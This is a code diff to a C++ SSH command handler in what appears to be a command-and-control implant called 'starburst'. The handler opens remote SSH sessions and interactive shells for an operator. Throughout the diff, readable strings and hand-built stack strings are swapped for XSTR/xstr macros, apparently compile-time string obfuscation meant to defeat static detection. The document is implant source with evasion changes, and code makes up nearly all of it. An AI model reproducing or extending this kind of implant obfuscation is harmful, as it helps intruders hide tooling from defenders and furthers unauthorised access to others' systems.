@@ -71,7 +71,7 @@ auto declfn starburst::cmd_ssh(
 
     if (!hostname || host_len == 0 || !username || user_len == 0) {
         queue_response(inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>(const_cast<char*>("missing hostname or username")));
+            XSTR( "missing hostname or username" ));
         return;
     }
 
@@ -95,7 +95,7 @@ auto declfn starburst::cmd_ssh(
         const char* err = ssh_last_error(inst);
         if (err) {
             char err_msg[384] = {};
-            char prefix[] = { 'S','S','H',' ','c','o','n','n','e','c','t',' ','f','a','i','l','e','d',':',' ', 0 };
+            xstr(prefix, "SSH connect failed: ");
             uint32_t plen = str_len(prefix);
             memory::copy(err_msg, prefix, plen);
             uint32_t elen = str_len(err);
@@ -104,7 +104,7 @@ auto declfn starburst::cmd_ssh(
             queue_response(inst, task_uuid, RESPONSE_ERROR, err_msg);
         } else {
             queue_response(inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>(const_cast<char*>("SSH connection failed")));
+                XSTR( "SSH connection failed" ));
         }
         return;
     }
@@ -113,7 +113,7 @@ auto declfn starburst::cmd_ssh(
     if (!ssh_shell_open(inst, (uint32_t)sess_idx)) {
         const char* err = ssh_last_error(inst);
         char err_msg[384] = {};
-        char prefix[] = { 'S','h','e','l','l',' ','o','p','e','n',' ','f','a','i','l','e','d',':',' ', 0 };
+        xstr(prefix, "Shell open failed: ");
         uint32_t plen = str_len(prefix);
         memory::copy(err_msg, prefix, plen);
         if (err) {
@@ -142,13 +142,13 @@ auto declfn starburst::cmd_ssh(
     if (!registered) {
         ssh_disconnect(inst, (uint32_t)sess_idx);
         queue_response(inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>(const_cast<char*>("no free interactive session slot")));
+            XSTR( "no free interactive session slot" ));
         return;
     }
 
     // Send initial output message with connection info
     char result[512] = {};
-    char msg[] = { 'C','o','n','n','e','c','t','e','d',' ','t','o',' ', 0 };
+    xstr(msg, "Connected to ");
     uint32_t roff = 0;
     uint32_t mlen = str_len(msg);
     memory::copy(result + roff, msg, mlen); roff += mlen;
@@ -167,7 +167,7 @@ auto declfn starburst::cmd_ssh(
 
     // Task stays alive - RESPONSE_PROCESSING keeps it open
     queue_response(inst, task_uuid, RESPONSE_PROCESSING,
-        symbol<char*>(const_cast<char*>("")));
+        XSTR( "" ));
 }
 
 #endif
